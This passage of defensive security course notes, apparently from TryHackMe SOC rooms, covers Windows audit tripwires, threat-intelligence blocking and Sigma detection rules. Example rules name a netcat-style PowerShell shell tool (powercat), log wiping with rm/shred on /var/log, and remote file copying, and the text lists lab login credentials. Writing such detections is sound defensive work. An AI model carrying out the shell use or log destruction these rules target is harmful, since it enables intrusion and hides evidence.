 is not visible, use the blue Show Split View button at the top-right of
 the page. You may use the following credentials if you prefer accessing
 the machine via RDP:

Machine IP: `10.10.174.137`

User: `Administrator`

Password: `Follina_0438`

Once
 the machine has initiated, click on the start icon and type "Local". 
The Local Security Policy application should appear. Open the 
application, then navigate to Security Settings → Local Policies → Audit Policy.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/5730991a0275d5f127a9cf5a48190a6e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/5730991a0275d5f127a9cf5a48190a6e.png)

Open the **Audit object access** policy,
 tick the boxes beside Success and Failure, click Apply, and finally 
click OK. This entails that all access attempts will be logged, 
regardless of whether it succeeded. Once you're done, you may proceed to
 close the Local Security Policy application.

After
 configuring the Local Security Policy, nothing new will immediately 
happen by default. We have to specify in the actual file or folder that 
we intend to monitor it and as such, for our purposes, we will create a 
fresh file wherein our tripwire setup can be implemented and 
consequently observed. Right-click anywhere on the desktop → New →
 Text Document. A new unnamed text file will appear on the Desktop, and 
we can name it "Secret Document". Right-click the document → ****Properties → Security → ****Advanced → Auditing.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/df38920ac582e1ff726bdc22fa6e5c9a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/df38920ac582e1ff726bdc22fa6e5c9a.png)

This is where we will create and specify an audit entry for our Secret Document. Click on Add → Select a principal.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/ccf4f8ae6a4d846b79828018484b7687.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/ccf4f8ae6a4d846b79828018484b7687.png)

This
 particular pop-up is where we can specify which users or groups we want
 to be alerted on whenever they access our Secret Document. You have a 
choice to be very granular, but for our purposes, we intend to be 
general and so, on the text box, write "Everyone", then press Enter.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/5edbca0cfc2af7e7ecef6900a8cfc88d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/5edbca0cfc2af7e7ecef6900a8cfc88d.png)

The
 Principal should now reflect "Everyone" and the permissions should now 
allow granular selection. Here you can specify all the activities on our
 Secret Document you want to audit. You can toggle to the advanced 
permissions via the Show advanced permissions on the upper right-hand 
corner of the area for an even broader selection of activities. Click OK
 when you're done exploring, and then click Apply and OK on the Audit 
entry page. Finally, we click on OK on our Secret Document properties.

An
 important note here is if you intend to track multiple files, it is 
recommended to have them categorized into folders so as to make it 
easier to audit their access.

At
 this point, the setup is complete and auditing is active for our Secret
 Document. Anyone who accesses it will be logged and its details will be
 recorded in the Security event log with an Event ID 4663. This Event 
ID, along with the other Object Access Event IDs, can then be filtered 
and furnished into alerts that would immediately tell your analysts of 
tripwires being activated, immediately giving value to the 
organization's security.

More info about Object Access Events, and the Audit Object access in general can be read [here](https://www.ultimatewindowssecurity.com/securitylog/book/page.aspx?spid=chapter7).

**Purple Teaming**

To
 cap this room off is a quick lesson on one of the best ways to 
strengthen an organization’s overall security posture - by leveraging 
purple team tactics. A couple of rooms that showcase purple teaming are 
the [Tempest](https://tryhackme.com/room/tempestincident) and [Follina (CVE-2022-30190)](https://tryhackme.com/room/follinamsdt) rooms.

The idea is simple: if you want to see how your defenses fare against an attack, understand how a certain vulnerability works and what it looks like on the logs, or you simply want to know the extent of your visibility on your environment - simulate an attack and then check the results.

Consequently, reflect on the following questions:

- What are the attacker techniques that you did?
- Which ones did you detect?
- Which ones flew under the radar?

The
 ones that you detected will affirm that you're doing a good job in 
those areas, whereas the ones you failed to detect constitute 
improvements that are ought to be made in your visibility and/or 
detection mechanisms.

# Quick Discussion for Tempest:

For
 the Tempest room, the room creator designed a full attack chain and 
emulated an adversary from start to finish, collecting valuable logs and
 showcasing detection and analysis tools as the room progresses. This is
 a classic example of the application of purple team tactics. The goal 
is to understand how logs will look like when specific attack techniques
 are being implemented against your environment.

# Quick Discussion for Follina MSDT:

From
 the Follina MSDT room, the room creator focused on the effects of the 
exploitation of the vulnerability in the environment and introduced how 
reviewing logs and process artifacts compliments publicly available 
IOCs.

From
 these findings, you can furnish alerts from the artifacts you've 
collected as well as from findings that you're able to observe via your 
logging mechanisms. These are just a couple of ways to leverage 
purple team tactics, and both show emphasis on how effective it is when 
leveraged well.

## **THREAT INTELLIGENCE FOR SOC**

**Threat Intelligence Feeds**

**Threat Intelligence Recap**

For a quick review, let's reiterate the definition of Threat Intelligence ****discussed in the [Intro to Cyber Threat Intel room](https://tryhackme.com/room/cyberthreatintel).

Threat
 Intelligence is the analysis of data and information using tools and 
techniques to generate meaningful patterns to mitigate against potential
 risks associated with existing or emerging threats targeting 
organisations, industries, sectors or governments.

There are different classifications of Threat Intelligence, and the primary types of it are:

- Strategic Intel: High-level intel that looks into the organisation's threat landscape and maps out
the risk areas based on trends, patterns and emerging threats that may
impact business decisions.
- Technical Intel: Examines evidence and artefacts of attacks an adversary uses. Incident Response
teams can use this intel to create a baseline attack surface to analyse
and develop defence mechanisms.
- Tactical Intel: Assesses adversaries' tactics, techniques, and procedures (TTPs). This intel can strengthen security controls and address vulnerabilities through
real-time investigations.
- Operational Intel: Assesses an adversary's specific motives and intent to perform an attack.
Security teams may use this intel to understand the critical assets
available in the organisation (people, processes, and technologies) that threat actors may target.

These classifications may give you an idea of how you operate with the data. But our only focus in this room is on **Technical Intel**,
 utilising artefacts generated by adversaries to improve the Security 
Operations pipeline. This type is the most common of the four classes 
and is mainly known as IOC-based Threat Intelligence.

Before
 applying Threat Intelligence to Security Operations, let's first deal 
with your understanding of how organisations differ in roles regarding 
Threat Intelligence.

# Consumers and Producers

*Do you build the knowledge base, or do you consume the knowledge of others?*

The
 common notion of Threat Intelligence is the dataset of known bad IOCs 
collated by different entities. It may be malicious URLs hosting malware
 or IP addresses of suspicious connections. But would you know how this 
information is gathered for the disposal of security analysts? Let's 
first differentiate the concept of Producers and Consumers of Threat 
Intelligence.

# Producers

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1f5dfdc4f4e8c58be2e82d78e506548c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1f5dfdc4f4e8c58be2e82d78e506548c.png)

Threat
 Intelligence Producers gather, analyse and disseminate threat 
intelligence data for others and themselves. These Producers create 
reports, advisories, and resources that are shared within the broader 
cybersecurity community. This group includes cybersecurity vendors, 
research labs and organisations specialising in collecting and 
interpreting data on emerging cyber threats.

Now, the Producers 
typically collect data using various methods and techniques. Standard 
methods include network monitoring, which involves monitoring an 
organisation's network traffic to identify abnormal behaviour from the 
inside or a honeypot server exposed externally.

Another example 
could be a collection of IOCs based on internal incidents handled by an 
organisation. These organisations expect a more significant number of 
incidents compared to small organisations with fewer assets to be 
compromised or user activity to be monitored. The results of these 
collections are then further analysed, attributed to potential threat 
actors, and published eventually to help other organisations.

These
 examples summarise that not every organisation can be a Producer. It 
requires a vast set of collected data, the capacity to determine 
expected normal behaviour, and the capability to analyse and pinpoint 
unknown potential threats.

# Consumers

On
 the other hand, Threat Intelligence Consumers are organisations or 
individuals who consume Threat Intelligence created by Producers. The 
information gathered from different sources is utilised to improve the 
organisation's security posture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/038992908630226ce5b091d4411d0294.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/038992908630226ce5b091d4411d0294.png)

How does this group typically leverage the intelligence data shared with them?

- **Identifying vulnerabilities** - Consumers can use published vulnerabilities discovered due to zero
days launched by threat actors to identify vulnerabilities in an
organisation's infrastructure. Advisories such as CVE publications are commonly utilised to determine if an organisation is impacted by it and apply mitigations if needed.
- **Prevention and Detection** - Consumers can use IOCs to prevent intrusions by blocking these
artefacts or detect them by applying them to threat detection rules.
- **Incident Response** - Consumers can use intelligence data to respond more effectively to
incidents as the data may confirm the likelihood of the attack and the
potentially attributed tactics and techniques.
- **Collaborating with others** - Information sharing is not only for Producers but also for Consumers. Data analysis of IOCs may still require human assessment, so it is
helpful to share information that is validated to be beneficial for
Security Operations.

**
Are you a Consumer or a Producer?**

Assessing
 whether your organisation is a Threat Intelligence Consumer or Producer
 depends on the roles and responsibilities of your security team and the
 overall cybersecurity strategy of your organisation.

| **Producer** | **Consumer** |
| --- | --- |
| Collect
 and analyse internal and external data to produce actionable threat 
intelligence that helps identify and prevent cyber threats. | Monitor
 the organisation's network and systems for potential security threats 
and vulnerabilities, and leverage external intelligence to supplement 
their analysis and understanding of those threats. |
| Create
 and distribute threat intelligence reports to other organisations, such
 as industry peers, regulators, or law enforcement agencies. | Use
 threat intelligence feeds and reports from third-party providers to 
identify potential security threats and vulnerabilities and integrate 
that information into your organisation's security posture. |

Once you have defined your role, you may also consider assessing your current practices based on the following:

| **Classification** | **Producer** | **Consumer** |
| --- | --- | --- |
| **Understanding** | Evaluate
 the quality of the intelligence produced by your organisation, 
including the information's relevance, accuracy, and timeliness. | Assess
 your organisation's understanding of threat intelligence and whether it
 is effectively being used to enhance your organisation's security 
posture. |
| **Collection** | Evaluate your 
organisation's ability to collect and analyse data from various sources,
 including network logs, endpoint data, and other sources. | Evaluate your organisation's ability to collect and consume threat intelligence from various sources. |
| **Analytics** | Assess
 your security team's technical and analytical skills, including their 
ability to detect and analyse threats and communicate their findings to 
other groups. | Evaluate your organisation's ability to analyse and process the threat intelligence that is being collected. |
| **Application** | Evaluate your organisation's ability to respond to threats based on the threat intelligence produced. | Evaluate your organisation's ability to respond to threats identified through threat intelligence. |

**Intelligence-driven Prevention**

*Your organisation 
has determined that you are a consumer of Threat Intelligence from 
reliable sources; your task is to apply the concepts of being a consumer
 by deploying controls to prevent threats in your infrastructure.*

Using
 our current knowledge of Threat Intelligence, we will utilise the IOCs 
from reliable sources to deploy security controls that will prevent 
malicious activity in our infrastructure.

To start with, we can first simplify the types of IOCs that are commonly distinguished in Threat Intelligence feeds:

- **Domains** - Typically attributed to URLs used to host malicious files, C2 callbacks or email domains used for spam.
- **IP Addresses** - Commonly attributed to addresses known to execute attacks seen from external assets or outbound callbacks from malware.

# IP Blocking via Firewall

****IP
 blocking is a well-known security measure that involves blocking 
ingress or egressing network traffic based on the device's IP address 
attempting to initiate a network connection. It is typically done using a
 Firewall, a security system that controls the traffic based on 
predetermined rules.

Configuring 
firewall rules could be overwhelming, but having a direction to deny 
connections from a known malicious IP address is a good start in 
preventing malicious connections, such as:

- Prevent intrusive connections against external applications that may affect
service uptime or compromise via a known vulnerability.
- Prevent connection attempts to the threat actor's infrastructure after successful malware execution.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9447acea4617b826bffbc64a6d385bff.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9447acea4617b826bffbc64a6d385bff.svg)

# Domain Blocking through Email Gateways

Similar
 to IP blocking, we can configure Email Gateways to prevent known 
malicious domains from forwarding incoming email messages based on the 
sender's domain. Email Gateways also depend on a ruleset, which should 
contain the block list of domains known to send spam or phishing emails.
 Once the block list is populated, the Email Gateway prevents threat 
actors from reaching the inbox of the target users in the organisation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/992aadb761286a6301b4efa6caa1f17d.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/992aadb761286a6301b4efa6caa1f17d.svg)

Preventing
 spam emails from reaching employees' inboxes reduces the potential 
attack surfaces of a threat actor in compromising the organisation. Most
 of the time, an organisation takeover starts with the execution of a 
malicious attachment or submitting credentials to a phishing website. An
 additional prevention layer slightly reduces the burden on the users' 
phishing awareness capabilities.

# Domain Blocking through DNS Sinkhole

DNS
 Sinkhole is a security measure that mitigates connections to a 
malicious domain. This is typically done by redirecting all DNS requests
 from a known malicious domain to a **sinkhole**, preventing the resolution to their counterpart IP addresses.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/aa03d5a63da69c07cc0ce996139707cf.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/aa03d5a63da69c07cc0ce996139707cf.svg)

**Intelligence-driven Detection**

*You
 have successfully deployed preventive mechanisms to mitigate known IOCs
 in your infrastructure. To maximise the capabilities of your detection 
and response, you are now tasked to improve the detection capabilities 
of your tooling.*

We have started utilising Threat Intelligence
 from the previous task to prevent potential compromises from malicious 
actors. Now, we will leverage Threat Intelligence IOCs to know if 
something suspicious is happening in our infrastructure effectively.

# Optimising Detection Capabilities

Implementing
 detection based on IOCs may be pretty straightforward, as one may think
 we can deploy a blocklist rule for known malicious IOCs. An example set
 of detection use cases is listed below for each common Threat Intel 
IOC.

| **Indicator of Compromise** | **Detection Use Case** |
| --- | --- |
| **IP Address** | Connections via Firewall logs wherein the direction of the connection dictates the potential root cause:
• Egress
 connection to a malicious IP indicates a potential execution of 
malware, thus communicating with a threat actor's IP address.
• Ingress
 connection from a malicious IP dictates an intrusion attempt from 
malicious actors, showing traces of the pre-exploitation phase. |
| **URL** | Connections via Proxy logs wherein the HTTP method dictates the nature of the connection:
• HTTP GET requests indicate a potential download of malicious files or access to a phishing website.
• Moreover, HTTP POST requests indicate a potential submission of credentials or exfiltration of stolen files. |
| **Domain** | Malicious domains seen in DNS logs directly indicate a malicious activity in either of the following:
• The domain hosts malware or additional files for its execution chain.
• The domain is a phishing website.
• The domain is being used for a C2 connection. |

The
 scenarios above depict the usage of publicly available IOCs to hit any 
suspicious connections across different data sources such as Firewalls, 
DNS and Proxy servers. However, this kind of setup may require 
continuous fine-tuning of rules to accommodate the growth of IOCs.

We can combine some prevention techniques discussed in Task 3 to detect suspicious traffic.

| **Prevention Technique** | **Detection Use Case** |
| --- | --- |
| **DNS Sinkhole** | Domains
 resolving a loopback (127.0.0.1 or 0.0.0.0) may indicate a connection 
to a malicious domain based on DNS' sinkhole blocklist configuration. |
| **Firewall IP Blocking** | Blocked
 connections to and from a specific IP address may indicate malicious 
activity and is worthy of investigation. Logs generated attributed to 
IOC blocking gives more context about the connection. |
| **Proxy Blocking** | Blocked
 web connections may indicate a malicious attempt to access malware or a
 phishing site. The Proxy service could provide more information if it 
has tagging capabilities to reflect malicious connections via tags. |
| **Mail Gateway Blocking** | Emails blocked based on the email sender's domain may indicate a spam attempt from a malicious sender. |

By
 doing so, the fine-tuning detection rules only rely on blocklist 
updates from prevention tactics. Hence, this way introduces an optimal 
way to prevent and detect malicious activity based on Threat 
Intelligence IOCs.

# Sigma Rules Revisited

As discussed throughout the Detection Engineering Module, [Sigma](https://tryhackme.com/room/sigma) is
 an open-source generic signature language to describe log events in a 
structured format. This allows for quick sharing of detection methods by
 security analysts.

In this task, we will use the following Sigma rule to hunt for sinkholed domains.

user@threatintel:~/

```
title: DNS Sinkhole
author: TryHackMe User
description: Sigma rule for sinkholed DNS queries
logsource:
 category: dns
detection:
 select_sinkholed:
   dns.resolved_ip:
     - '0.0.0.0'
 condition: select_sinkholed
falsepositives:
 - Unknown
status: experimental
level: medium
tags:
 - dns
 - filebeat

```

The Sigma rule above hunts for DNS queries resolving `0.0.0.0`.
 As discussed previously, such cases may indicate a connection to a 
known suspicious domain based on DNS Sinkhole configuration.

**Playing with ElastAlert and Uncoder.io**

To emulate sample detection, we will use [Uncoder.io](https://uncoder.io/) to translate the previously mentioned Sigma rule into ElastAlert. Ensure that the conversion is set from Sigma to ElastAlert before clicking **Translate**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4db3cbfdc69b108708f67284319b0105.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4db3cbfdc69b108708f67284319b0105.png)

Before we use the generated rule, let's have a quick run-through about ElastAlert.

[ElastAlert](https://elastalert.readthedocs.io/en/latest/)
 is an open-source framework for alerting on anomalies, spikes, or other
 patterns of interest found in data stored in Elasticsearch. It 
integrates with Elasticsearch, Kibana, and other tools in the 
Elasticsearch ecosystem and can be configured to send alerts to various 
external services such as Email, Slack, PagerDuty, and more.

The resulting ElastAlert rule from Uncoder.io contains the following information:

| **Field** | **Definition** |
| --- | --- |
| **alert** | The Alerter type to use. The value `debug` will log the alert information at the info level. |
| **filter** | A list of Elasticsearch query filters. The current query searches for all domains resolving to **0.0.0.0**. |
| **index** | The name of the index that will be searched. In our current context, the rule will scan the contents of the `filebeat-*` index. |
| **realert** | This option allows you to ignore repeating alerts for some time. The value `minutes: 0` will generate all alerts despite its redundancy. |
| **type** | The rule type to use. The value `any` will generate an alert for every successful query return. |

Now that we have introduced ElastAlert, **access the machine via SSH using the provided credentials in Task 2 (user:tryhackme)** and navigate to the **~/elastalert** directory. You may see that the directory contains a config file and a subdirectory.

user@threatintel:~/elastalert

```
user@threatintel:~/elastalert$ lsconfig.yaml  rules
user@threatintel:~/elastalert$ ls rules/sinkhole.yaml

```

The **config.yaml** file contains all the configurations needed to connect and query to our Elasticsearch instance, while the **~/elastalert/rules** directory contains a placeholder rule. You may populate this rule with the translated Sigma to ElastAlert rule from Uncoder.io.

**Note:** **After
 copying the Elastalert rule generated by Uncoder.io, execute the 
following to clean the syntax and point ElastAlert to the right index.**

- **In the description field, remove the string starting from** `Author:` **until the end of the line. This is being removed to make the syntax of the ElastAlert rule valid.**
- **In the index field, replace** `winlogbeat-*` **with** `filebeat-*`**.**

The ElastAlert rule should be similar to the one below after executing the steps mentioned above.

user@threatintel:~/elastalert/rules

```
user@threatintel:~/elastalert/rules$ cat sinkhole.yamlalert:
- debug
description: Sigma rule for sinkholed DNS queries.
filter:
- query_string:
    query: dns.resolved_ip:"0.0.0.0"
index: filebeat-*
name: dns_sinkhole
priority: 3
realert:
  minutes: 0
type: any

```

After configuring the **sinkhole.yaml** rule, navigate back to the elastalert directory and start executing ElastAlert.

user@threatintel:~/elastalert

```
user@threatintel:~/elastalert/rules$ cd ~/elastalertuser@threatintel:~/elastalert$ elastalert --start 2023-02-16T00:00:00 --verbose 2>&1 | tee output.txt
```

The **elastalert** command above can be broken down as:

- ElastAlert executes the rule we configured starting from **02/16/2023** until the present.
- It also provides verbose output.
- Lastly, the snippet uses `2>&1 | tee output.txt` to write the results into **output.txt**. Note that file descriptors were used since the output is being written at the **INFO level**.

Once
 the command is executed, you may need to wait a few seconds to finish 
the initial run. The following string indicates that the execution is 
finished: `X query hits (X already seen), X matches, X alerts sent`

## **SIGMA**

What is Sigma?

Through log monitoring and analysis, SOC analysts
are tasked with collecting, analysing and extracting as much usable
information from logs and using it to build detection queries and searches
for their environments. However, on most occasions, it becomes challenging
to standardise investigations and have the ability to share them with other
analysts for detection enrichment. Sharing Indicators of compromise (IOC) and signatures may
not be enough, as log events are often left unattended. Here is where
Sigma seeks to bridge the gap.

[Sigma](https://github.com/SigmaHQ/sigma) is an open-source generic signature language developed by
Florian Roth & Thomas Patzke to describe log events in a
structured format. This allows for quick sharing of detection methods by
security analysts. It is mentioned that **"Sigma is for log files as Snort is for network traffic, and Yara is for files."**

Sigma makes it easy to perform 
content matching based on collected
logs to raise threat alerts for analysts to investigate. Log files are 
usually collected and stored in a database or SIEM solution for further
analysis.

### Sigma Use Cases

Sigma was developed to satisfy the following uses:

- To make detection methods and signatures shareable alongside IOCs
and Yara rules.
- To write SIEM searches that avoid vendor lock-in.
- To share signatures with threat intelligence communities.
- To write custom detection rules for malicious behaviour based on
specific conditions.

### Sigma Development Process

As a SOC analyst, the process of using Sigma to write up your
detection rules will involve understanding the elements mentioned below:

- **Sigma Rule Format:** Generic structured log descriptions
written in YAML.
- **Sigma Converter:** A set of python scripts that will
process the rules on the backend and perform custom field matching based
on specified SIEM query language.
- **Machine Query:** Resulting search query to
filter out alerts during investigations. The query will be based on the
specified SIEM.

The [Sigma GitHub repo](https://github.com/SigmaHQ/sigma)
 provides information about the project, public rules, tests and 
conversion tools. Please have a look at the project as we progress 
through the room.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/3ca5f3390de82a626b59a4a02ce2ef1d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/3ca5f3390de82a626b59a4a02ce2ef1d.png)

**Sigma Rule Syntax**

As indicated in the previous task, Sigma rules are written in YAML
Ain't Markup Language ([YAML](http://yaml.org/)), a
data serialisation language that is human-readable and useful for 
managing data. It's often used as a format for configuration files, but 
its
object serialisation abilities make it a substitute for languages like
JSON.

Common factors to note about YAML files are:

- YAML is case-sensitive.
- Files should have the `.yml` extension.
- Spaces are used for indentation and not tabs.
- Comments are attributed using the `#` character.
- Key-value pairs are denoted using the colon `:`
character.
- Array elements are denoted using the dash ``
character.

[QuickYAML Guide](https://www.tutorialspoint.com/yaml/yaml_quick_guide.htm)

### Sigma Syntax

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/9e7c91812a16cd85cccf3671ff8027ee.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/9e7c91812a16cd85cccf3671ff8027ee.png)

Following the understanding of using

YAML

for Sigma rules, the syntax
defines various mandatory and optional fields that go into every
rule. This can be highlighted using the image:

Let us use an example of a WMI Event Subscription [rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/wmi_event/sysmon_wmi_event_subscription.yml)
 to define the different syntax elements. Download the attached task 
file, and open it in a text editor to go through this room's rule syntax
 and rule writing sections.

- **Title:** Names the rule based on what it is
supposed to detect. This should be short and clear.
- **ID:** A globally unique identifier mainly used by the developers of Sigma to maintain the order of identification for the rules submitted to the public repository, found in
UUID format.
    
    You may also add references to related rule IDs using
    the *related* attribute, making it easier to form relationships between detections. These relations would fall under the following types:
    
    - Derived: This will describe that the rule has sprung from another rule, which may still be active.
    - Obsolete: This will indicate that the listed rule is no longer being used.
    - Merged: This will indicate that the rule combines linked rules.
    - Renamed: This indicates the rule was
    previously identified under a different ID but has now been changed due
    to changes in naming schemes or avoiding collisions.
    - Similar: This attribute points to
    corresponding rules, such as indicating the same detection content
    applied to different log sources.
- **Status:** Describes the stage in which the rule maturity is at while in use. There are five declared statuses that you can use:
    - *Stable*: The rule may be used in production environments and dashboards.
    - *Test*: Trials are being done to the rule and could require fine-tuning.
    - *Experimental*: The rule is very generic and is being tested. It could lead to false results, be noisy, and identify interesting events.
    - *Deprecated*: The rule has been replaced and would no longer yield accurate results. The`related` field is used to create associations between the current rule and one that has been deprecated.
    - *Unsupported*: The rule is not usable in its current state (unique correlation log, homemade fields).
- **Description:** Provides more context about the
rule and its intended purpose. With the rule, you can be as verbose as possible on the malicious activity you intend to detect.

WMI_Event_Subscription.yml

```
title:WMI Event Subscription
id: 0f06a3a5-6a09-413f-8743-e6cf35561297
status: test
description: Detects creation of WMI event subscription persistence method.

```

- **Logsource:** Describes the log data to be used for
the detection. It consists of other optional attributes:
    - *Product*: Selects all log outputs of a particular product.
    Examples are Windows, Apache.
    - *Category*: Selects the log files written by the selected
    product. Examples are firewall, web, and antivirus.
    - *Service*: Selects only a subset of the logs from the selected product. Examples
    are *sshd* on Linux or *Security* on Windows.
    - *Definition*: Describes the log source and any applied configurations.

WMI_Event_Subscription.yml

```
logsource:
   product: windows
   category: wmi_event

```

- **Detection:** A required field in the detection rule describes the parameters of the malicious
activity we need an alert for. The parameters are divided into two main
parts: the search
identifiers - the fields and values that the detection should be
searching for - and condition expression - which sets the action to be
taken on the detection, such as selection or filtering. More on this is
below.
    
    This rule has a detection modifier that looks for logs with one
    of Windows Event IDs 19, 20 or 21. The condition informs the
    detection engine to match and select the identified logs.
    

WMI_Event_Subscription.yml

```
detection:
  selection:
    EventID:  # This shows the search identifier value
      - 19    # This shows the search's list value
      - 20
      - 21
  condition: selection
```

- **FalsePositives:** A list of known false positive
outputs based on log data that may occur.
- **Level:** Describes the severity with which the activity should be taken under the written rule. The attribute comprises five levels: Informational -> Low -> Medium -> High -> Critical
- **Tags:** Adds information that may be used to
categorise the rule. Tags may include values for CVE numbers and tactics
and techniques from the MITRE ATT&CK framework. Sigma developers
have defined a list of [predefined
tags](https://github.com/SigmaHQ/sigma/wiki/Tags).

WMI_Event_Subscription.yml

```
falsepositives:
    - Exclude legitimate (vetted) use of WMI event subscription in your network

level: medium

tags:
  - attack.persistence # Points to theMITRE tactic.  - attack.t1546.003   # Points to theMITRE technique.
```

### Search Identifiers
and Condition Expressions

As mentioned earlier, the detection section of the rule describes
what you intend to search for within the log data and how the selection
and filters are to be evaluated. The definition of the search
identifiers can comprise two data structures
- **lists and maps** - which dictate the order in which
the detection would be processed.

When the identifiers are provided using lists, they will be presented
using strings linked with a logical **'OR'**
operation. Mainly, they will be listed using hyphens (-). For example,
below, we can look at an extract of the [Netcat
Powershell Version rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_classic/posh_pc_powercat.yml) where the detection is written to match on
the `HostApplication` field containing 'powercat' or 'powercat.ps1' as its
value.

Posh_PC_Powercat.yml

```
detection:
  selection:
    HostApplication|contains:
         - 'powercat'
         - 'powercat.ps1'
  condition: selection

```

On the other hand, maps comprise key/value pairs where the key
matches up to a field in the log data while the value presented is
a string or numeral value to be searched for within the log.
Maps follow a logical **'AND'** operation.

As an example, we can look at the [Clear
Linux log rule](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_clear_logs.yml) where the `selection` term forms the map, and the rule intends to match on `Image|endswith` either of
the values listed, AND `CommandLine` contains either value
listed. This example shows how maps and lists can be used together when
developing detections. It should be noted that `endswith`
and `contains` are value modifiers, and two lists are
used for the search values, where one of each group has to match for the
rule to initiate an alert.

Process_Creation_Lnx_Clear_Logs.yml

```
detection:
  selection:
    Image|endswith:
         - '/rm' # covers /rmdir as well         - '/shred'
    CommandLine|contains:
         - '/var/log'
         - '/var/spool/mail'
  condition: selection
```

As we have mentioned the value modifier, it is worth noting that they
are appended after the field name with a pipe character (|), and there
are two types of value modifiers:

- **Transformation modifiers:** These change the values
provided into different values and can modify the logical
operations between values. They include:
    - *contains:* The value would be matched anywhere in the
    field.
    - *all:* This changes the OR operation of lists into an AND
    operation. This means that the search conditions has to match all listed
    values.
    - *base64:* This looks at values encoded with Base64.
    - *endswith:* With this modifier, the value is expected to be
    at the end of the field. For example, this is representative of
    `\cmd.exe`.
    - *startswith:* This modifier will match the value at the
    beginning of the field. For example, `power*`.
- **Type modifiers:** These change the type of the value
or sometimes even the value itself. Currently, the only usable type
modifier is `re`, which is supported by Elasticsearch queries to
handle the value as a regular expression.

For conditions, this is based on the names set for your detections, such as *selection and* *filter,* and will determine the
specification of the rule based on a selected expression. Some of the
terms supported include:

- **Logical AND/OR**
- **1/all of search-identifier**
- **1/all of them**
- **not**

An example of these conditional values can be seen in the extract
below from the [Remote
File Copy rule](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/builtin/lnx_file_copy.yml), where the detection seeks to look for either of the
tools: `scp`, `rsync` or `sftp` and with
either filter values `@` or `:`.

Remote_File_Copy.yml

```
detection:
  tools:
         - 'scp'
         - 'rsync'
         - 'sftp'
  filter:
         - '@'
         - ':'
  condition: tools and filter
```

Another example to showcase a combination of the conditional expressions can be seen in the extract
below from the [Run Once Persistence Registry Event rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_event/registry_event_runonce_persistence.yml),
 where the detection seeks to look for values on the map that start and 
end with various registry values while filtering out Google Chrome and 
Microsoft Edge entries that would raise false positive alerts.

Registry_Event_RunOnce_Persistence.yml

```
detection:
  selection:
    TargetObject|startswith: 'HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components'
    TargetObject|endswith: '\StubPath'
  filter_chrome:
    Details|startswith: '"C:\Program Files\Google\Chrome\Application\'
    Details|endswith: '\Installer\chrmstp.exe" --configure-user-settings --verbose-logging --system-level'
  filter_edge:
    Details|startswith:
    - '"C:\Program Files (x86)\Microsoft\Edge\Application\'
    - '"C:\Program Files\Microsoft\Edge\Application\'
    Details|endswith: '\Installer\setup.exe" --configure-user-settings --verbose-logging --system-level --msedge
    --channel=stable'
  condition: selection and not 1 of filter_*
```

Click the link to find more information about the [Sigma syntax
specification.](https://github.com/SigmaHQ/sigma/wiki/Specification)

**Rule Writing & Conversion**

After
 going through the basic syntax of Sigma rules, it is crucial to 
understand how to write them based on a threat investigation. As a SOC
 analyst, you must go through the thought process of developing your 
detection and writing the rules appropriate for your environment. We 
shall use the scenario below to go through this process.

Start up the attached machine and give it 5 minutes to load. Login to the Kibana dashboard on [http://10.10.127.2/](http://10.10.127.2/),
 which has been populated with logs for testing the detection rules 
written in this task and the practical scenario in task 6. Use the 
credentials **THM_Analyst: THM_Analyst1234.**  Deploy the AttackBox and log in to the Kibana dashboard using Firefox.

### Scenario

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/8599f0378042bcfa6680158b3f1ff759.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/8599f0378042bcfa6680158b3f1ff759.png)

Administrators rely on remote tools to ensure devices are configured,
patched and maintained. However, your SOC Manager just received and
shared intel on how AnyDesk, a legitimate remote tool, can be downloaded
and installed silently on a user's machine using the file description on the right-hand side. (Source:

